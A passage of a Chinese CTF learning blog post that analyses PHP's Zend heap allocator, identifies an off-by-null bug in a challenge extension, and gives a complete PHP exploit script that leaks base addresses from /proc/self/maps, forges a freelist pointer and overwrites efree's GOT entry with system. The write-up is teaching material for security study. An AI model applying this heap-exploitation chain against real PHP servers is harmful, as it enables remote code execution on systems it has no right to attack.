class="number">0x1f</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(_WIN32)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!BitScanReverse(&amp;index, (<span class="type">unsigned</span> <span class="type">long</span>)size)) &#123;</span><br><span class="line">    <span class="comment">/* undefined behavior */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">64</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (((<span class="number">31</span> - (<span class="type">int</span>)index) ^ <span class="number">0x1f</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0x00ff</span>) &#123;n -= <span class="number">8</span>; size = size &lt;&lt; <span class="number">8</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0x0fff</span>) &#123;n -= <span class="number">4</span>; size = size &lt;&lt; <span class="number">4</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0x3fff</span>) &#123;n -= <span class="number">2</span>; size = size &lt;&lt; <span class="number">2</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0x7fff</span>) &#123;n -= <span class="number">1</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段主要是将用户请求的大小转换为对应的freelist索引值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 324</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BIN_DATA_SIZE(num, size, elements, pages, x, y) size,</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> bin_data_size[] = &#123;</span><br><span class="line">	ZEND_MM_BINS_INFO(_BIN_DATA_SIZE, x, y)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_alloc_sizes.h, line 31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* num, size, count, pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_MM_BINS_INFO(_, x, y) \</span></span><br><span class="line"><span class="meta">	_( 0,    8,  512, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 1,   16,  256, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 2,   24,  170, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 3,   32,  128, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 4,   40,  102, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 5,   48,   85, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 6,   56,   73, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 7,   64,   64, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 8,   80,   51, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_( 9,   96,   42, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(10,  112,   36, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(11,  128,   32, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(12,  160,   25, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(13,  192,   21, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(14,  224,   18, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(15,  256,   16, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(16,  320,   64, 5, x, y) \</span></span><br><span class="line"><span class="meta">	_(17,  384,   32, 3, x, y) \</span></span><br><span class="line"><span class="meta">	_(18,  448,    9, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(19,  512,    8, 1, x, y) \</span></span><br><span class="line"><span class="meta">	_(20,  640,   32, 5, x, y) \</span></span><br><span class="line"><span class="meta">	_(21,  768,   16, 3, x, y) \</span></span><br><span class="line"><span class="meta">	_(22,  896,    9, 2, x, y) \</span></span><br><span class="line"><span class="meta">	_(23, 1024,    8, 2, x, y) \</span></span><br><span class="line"><span class="meta">	_(24, 1280,   16, 5, x, y) \</span></span><br><span class="line"><span class="meta">	_(25, 1536,    8, 3, x, y) \</span></span><br><span class="line"><span class="meta">	_(26, 1792,   16, 7, x, y) \</span></span><br><span class="line"><span class="meta">	_(27, 2048,    8, 4, x, y) \</span></span><br><span class="line"><span class="meta">	_(28, 2560,    8, 5, x, y) \</span></span><br><span class="line"><span class="meta">	_(29, 3072,    4, 3, x, y)</span></span><br></pre></td></tr></table></figure>
<p>从上面的定义可以获取30个freelist对应的chunk大小。可以看到，PHP在分配这部分内存时是以页为最小单位整个分配的，如对于大小为8的chunk，在初次分配时，应该是分配一整页4KB，随后将这一页拆分为512个8B大小的chunk来使用。</p>
<p>下面重点关注一下<code>zend_mm_alloc_small</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 1243</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line">        <span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">        heap-&gt;size = size;</span><br><span class="line">        heap-&gt;peak = peak;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">        heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>忽略宏定义中的内容，看下面的部分。首先会检查对应的freelist链表是否存在已经释放的chunk，如果有，则使用链表的第一个chunk作为返回值。否则会调用<code>zend_mm_alloc_small_slow</code>另外分配内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 1187</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_mm_chunk *chunk;</span><br><span class="line">	<span class="type">int</span> page_num;</span><br><span class="line">	zend_mm_bin *bin;</span><br><span class="line">	zend_mm_free_slot *p, *end;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">	...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(bin == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="comment">/* insufficient memory */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">	page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">	chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line">	<span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">			i++;</span><br><span class="line">		&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">	end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">	heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">		...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">	&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* terminate list using NULL */</span></span><br><span class="line">	p-&gt;next_free_slot = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* return first element */</span></span><br><span class="line">	<span class="keyword">return</span> bin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个函数中，我们可以清晰地看到，<code>zend_mm_alloc_pages</code>之后，PHP构造了包含所有新分配的chunk的链表并放在freelist链表头部。即freelist链表不仅包含被释放的chunk，也有未被分配的chunk。最后返回其中的第一个chunk。</p>
<p>而对于chunk的释放，则非常简单，直接将该chunk放到对应freelist的头部即可。在分配与释放过程中，没有进行任何的安全检查，因此一旦出现堆相关漏洞，常常可以大做文章。</p>
<h1 id="a4-漏洞挖掘"><a class="markdownIt-Anchor" href="#a4-漏洞挖掘"></a> A.4 漏洞挖掘</h1>
<p>从上面的分析来看，内存分配与释放均需要一个参数，但Ghidra没有识别出来，将参数添加后发现，先前发现的可能的溢出漏洞实际上并不存在，<code>hacker_entry</code>的最后一个字段实际上是一个不定长数组，在实际分配内存时会根据传入的字符串长度确定chunk大小。</p>
<p>那么，这道题的漏洞点又在何处？需要注意<code>zif_displayHacker</code>和<code>zif_addHacker</code>函数，在<code>memcpy</code>之后，有一个在字符串尾部添加<code>\0</code>的操作，这实际上是off by null。</p>
<p><img src="9.png" alt="" /></p>
<p>由于freed chunk将链表指针放在chunk首部，chunk与chunk之间没有任何分隔，因此off by null有机会修改链表指针的值。将该指针的值修改为一个chunk A内部的地址，这样可以通过chunk A的重写完全覆盖chunk A后面的chunk B的链表指针。本题的so文件没有使用FULL RELRO安全保护，因此可以完成覆盖GOT表的操作，后面的内容就不用多说了。</p>
<h1 id="b-漏洞利用"><a class="markdownIt-Anchor" href="#b-漏洞利用"></a> B. 漏洞利用</h1>
<p>明确漏洞后，接下来就是考虑如何利用该漏洞。本题中我们可以完成PHP文件上传，因此直接将exp PHP文件上传后通过网址执行即可。</p>
<p>不过在php.ini中，题目定义了很多禁用的函数，保存在<code>disable_function</code>中。在实际编写PHP脚本时，需要注意不要使用这里提到的函数。</p>
<p>在本题中，我们可以通过读取<code>/proc/self/maps</code>的方法获取PHP进程的libc基地址以及堆内存的基地址。但我们并不能直接通过<code>fopen</code>函数打开文件，这主要是防止我们直接去读取flag文件。不过，PHP功能强大，我们还是能够找到读取<code>/proc/self/maps</code>的方法。flag文件在普通权限下无法读取，但<code>/proc/self/maps</code>可以读取。</p>
<p>在<code>zend_mm_alloc_small_slow</code>中可以看到，初次分配的单向链表是低地址的chunk在头部，高地址的chunk在尾部。因此我们可以首先分配几个相同大小的chunk，随后按照从高到低的顺序释放。</p>
<p>需要注意的是，PHP不允许运行在其他版本下构建的C扩展，在API确认可用的情况下，可以通过修改<code>module_entry</code>中的<code>zend_api</code>与<code>build_id</code>中的版本信息使其在不同PHP版本下运行。</p>
<p>在解题过程中，通过gdb调试能够加快进度，此类PHP pwn的调试方法参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-282026.htm#msg_header_h3_11">资料</a>完成。下面演示一下调试流程。</p>
<h2 id="b1-php调试"><a class="markdownIt-Anchor" href="#b1-php调试"></a> B.1 PHP调试</h2>
<p>在docker中安装gdbserver后，运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver :1234 php -S 0:8080 index.php</span><br></pre></td></tr></table></figure>
<p>使gdbserver监听本地1234端口，PHP监听本地8080端口。访问8080端口即相当于执行<code>php index.php</code>。随后多次使用<code>n</code>命令。遇到的第一个call指令调用后，将加载PHP运行过程中需要的所有动态链接库（不含C扩展），进入<code>_start</code>后会进入<code>_libc_start_main</code>，在一条<code>call rax</code>指令执行后进入监听状态，同时会显示加载C扩展情况，如下面两图所示。</p>
<p><img src="10.png" alt="" /></p>
<p><img src="11.png" alt="" /></p>
<p>在vuln.so中打下断点后，访问8080端口，即可让gdb断在想要的地方。</p>
<p>下面是PHP中的<code>_emalloc</code>函数：</p>
<p><img src="12.png" alt="" /></p>
<p>这其中内联了<code>zend_mm_alloc_small</code>函数，一直跟进理解代码语义，我们能够找到堆的freelist结构：</p>
<p><img src="13.png" alt="" /></p>
<p>可以看到，这里的freelist中低地址的chunk位于链表的前面。因此有下面的漏洞利用思路，即想办法构造一个地址最后1字节为’\x00’的fake pointer指向free.got，随后在同一个freelist中通过off by null将这个fake pointer链入这个freelist中。如下图所示。</p>
<p><img src="14.png" alt="" /></p>
<p>这里解释一下使用0x70 chunk freelist的原因。在整个漏洞利用过程中，首先需要一个能够写入0x…00这种地址的chunk A，随后需要一个chunk B完成off by null，破坏后面的chunk C的指针。原先chunk C的指针指向chunk D，且chunk D地址除了最低字节外其他字节应该与chunk A写入的地址相同。在0x70 chunk freelist中，可以利用0x2a0、0x310、0x380、0x3f0这4个chunk，即0x2a0写入0x300为free.got，0x310完成off by null，将0x380处由0x3f0改为0x300，这样就可以完成指针伪造，并最终能够成功分配到首地址为0x300的chunk。</p>
<h2 id="b2-exp"><a class="markdownIt-Anchor" href="#b2-exp"></a> B.2 exp</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$libc_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$vuln_so_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"><span class="variable">$system_off</span> = <span class="number">0x45e90</span>;</span><br><span class="line"><span class="variable">$map_file</span> = <span class="string">&quot;/proc/self/map&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_so_base</span>(<span class="params"><span class="variable">$buffer</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$vuln_so_base</span>;</span><br><span class="line">    <span class="variable">$libc_line_regex</span> = <span class="string">&quot;/([0-9a-f]+)-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2\.31\.so/&quot;</span>;</span><br><span class="line">    <span class="variable">$vuln_so_line_regex</span> =</span><br><span class="line">        <span class="string">&quot;/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-[0-9]+\/vuln\.so/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$libc_line_regex</span>, <span class="variable">$buffer</span>, <span class="variable">$matches</span>))</span><br><span class="line">        <span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Failed to get libc base&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$vuln_so_line_regex</span>, <span class="variable">$buffer</span>, <span class="variable">$matches</span>))</span><br><span class="line">        <span class="variable">$vuln_so_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Failed to get vuln.so base&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$value</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ret</span> &amp; <span class="number">0xFF</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$ret</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$value</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$value</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// open a buffer and read the content of /proc/self/maps</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">get_so_base</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$efree_got</span> += <span class="variable">$vuln_so_base</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;libc base address: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$libc_base</span>) . <span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;vuln.so base address: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$vuln_so_base</span>) . <span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;_efree.got: &quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$efree_got</span>) . <span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x5f</span>));</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&quot;echo \&quot;success\&quot;\x00&quot;</span> . <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x70</span>-<span class="number">15</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x5f</span>));</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x70</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x5f</span>));</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;x&quot;</span>, <span class="number">0x50</span>) . <span class="title function_ invoke__">p64</span>(<span class="variable">$efree_got</span>));  <span class="comment">// 0x2A0</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;!&quot;</span>, <span class="number">0x60</span>));                    <span class="comment">// 0x310, off by null</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x70</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;x&quot;</span>, <span class="number">0x5f</span>));</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">p64</span>(<span class="variable">$libc_base</span> + <span class="variable">$system_off</span>) . <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x67</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x38</span>));</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>成功利用，效果如下，这里仅显示在本地执行命令的结果。如果无法成功利用，可能是PHP环境问题，根据freelist状态调整冗余chunk的分配数量即可。</p>
<p><img src="15.png" alt="" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">PHP pwn 学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-06-19 20:44:54" itemprop="dateCreated datePublished" datetime="2024-06-19T20:44:54+08:00">2024-06-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-06-21 19:04:21" itemprop="dateModified" datetime="2024-06-21T19:04:21+08:00">2024-06-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">PHP pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>17 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近在D3CTF中发现了一道与PHP有关的Pwn题，当时由于事务繁忙没有及时学习，结果在不久之后的长城杯决赛中就遭到报应了，PHP pwn现场不会做。毕设做完之后，现在总算有时间拾起都有点陌生的CTF了。下面就来记录一下PHP pwn的学习过程。</p>
